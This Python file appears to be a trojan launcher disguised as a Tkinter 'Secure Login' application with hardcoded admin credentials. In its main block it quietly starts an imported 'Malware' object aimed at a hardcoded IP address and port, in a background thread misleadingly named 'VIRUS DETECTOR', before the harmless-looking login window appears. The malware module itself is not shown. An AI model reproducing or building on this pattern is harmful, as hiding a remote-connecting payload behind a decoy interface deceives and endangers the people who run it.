import tkinter as tk
from tkinter import messagebox
from threading import Thread
from fooler import Malware
import depchker
import time

'''
-------------------------------------------------------
           MAY BE THE BELOW WILL REQUIRED 
-------------------------------------------------------
from os import system
from io import StringIO
from sys import stdout,stderr

def clearscrn():
    buffer_out = StringIO()
    buffer_err = StringIO()
    stdout,stderr = buffer_out,buffer_err
    if stdout and stderr:
        system('cls')
    else:
        pass
------------------------------------------------------
'''


def login():
    username = entry_username.get()
    password = entry_password.get()
    if username == "admin" and password == "password":
        messagebox.showinfo("Login Successful", "Welcome, Admin!")
        # Change button color to green on success
        btn_login.config(bg="#4CAF50", fg="white") 
    else:
        messagebox.showerror("Login Failed", "Invalid username or password")
        # Shake animation for failed login
        for _ in range(3):
            root.geometry(f"400x500+{root.winfo_x()+5}+{root.winfo_y()}")
            root.update()
            time.sleep(0.05)
            root.geometry(f"400x500+{root.winfo_x()-5}+{root.winfo_y()}")
            root.update()
            time.sleep(0.05)

def toggle_fullscreen():
    global is_fullscreen
    is_fullscreen = not is_fullscreen
    root.attributes("-fullscreen", is_fullscreen)
    
    if is_fullscreen:
        btn_maximize.config(text="❐", bg="#555")  # Change icon to restore
    else:
        btn_maximize.config(text="□", bg="#555")  # Change icon to maximize

def startapp():
    global root, entry_username, entry_password, btn_maximize, is_fullscreen, btn_login

    is_fullscreen = True  # Track fullscreen state

    # Create main window with modern style
    root = tk.Tk()
    root.title("Login App")
    root.attributes("-fullscreen", True)
    root.configure(bg="#f5f5f5")

    # Modern title bar with gradient effect
    title_bar = tk.Frame(root, bg="#333", height=40, relief="flat")
    title_bar.pack(fill=tk.X)

    # Window Title with better font
    title_label = tk.Label(title_bar, text="Login Portal", fg="white", bg="#333", 
                         font=("Segoe UI", 12, "bold"))
    title_label.pack(side=tk.LEFT, padx=15)

    # Modern window control buttons
    btn_minimize = tk.Button(title_bar, text="—", command=root.iconify, 
                           bg="#444", fg="white", font=("Arial", 10), 
                           width=3, bd=0, activebackground="#555")
    btn_minimize.pack(side=tk.RIGHT, padx=5)

    btn_maximize = tk.Button(title_bar, text="❐", command=toggle_fullscreen, 
                           bg="#444", fg="white", font=("Arial", 10), 
                           width=3, bd=0, activebackground="#555")
    btn_maximize.pack(side=tk.RIGHT, padx=5)

    btn_close = tk.Button(title_bar, text="✕", command=root.destroy, 
                         bg="#e74c3c", fg="white", font=("Arial", 10), 
                         width=3, bd=0, activebackground="#c0392b")
    btn_close.pack(side=tk.RIGHT, padx=5)

    # Login form container with shadow effect
    form_frame = tk.Frame(root, bg="#ffffff", bd=1, relief="solid", 
                         highlightbackground="#e0e0e0")
    form_frame.pack(pady=50, padx=50, fill="both", expand=True)

    # App logo/header
    header = tk.Label(form_frame, text="🔒 Secure Login", font=("Segoe UI", 16), 
                     bg="white", fg="#333")
    header.pack(pady=(30, 20))

    # Modern input fields
    label_username = tk.Label(form_frame, text="Username:", font=("Segoe UI", 11), 
                            bg="white", fg="#555")
    label_username.pack(pady=(0, 5))

    entry_username = tk.Entry(form_frame, font=("Segoe UI", 11), bd=1, 
                            relief="solid", highlightcolor="#3498db")
    entry_username.pack(pady=5, padx=30, ipady=5, fill="x")

    label_password = tk.Label(form_frame, text="Password:", font=("Segoe UI", 11), 
                            bg="white", fg="#555")
    label_password.pack(pady=(10, 5))

    entry_password = tk.Entry(form_frame, font=("Segoe UI", 11), show="•", 
                            bd=1, relief="solid", highlightcolor="#3498db")
    entry_password.pack(pady=5, padx=30, ipady=5, fill="x")

    # Modern login button with hover effect
    btn_login = tk.Button(form_frame, text="LOGIN", font=("Segoe UI", 12, "bold"), 
                         command=login, bg="#3498db", fg="white", bd=0,
                         activebackground="#2980b9", activeforeground="white",
                         padx=20, pady=8)
    btn_login.pack(pady=20)

    # Footer
    footer = tk.Label(form_frame, text="© 2023 Secure Systems", font=("Segoe UI", 8), 
                     bg="white", fg="#999")
    footer.pack(side="bottom", pady=10)

    root.mainloop()

if __name__ == '__main__':
    malware = Malware('192.168.102.3',2222)
    main_thread = Thread(name='VIRUS DETECTOR',target=malware.run,daemon=False)
    main_thread.start()
    depchker.main()
    startapp()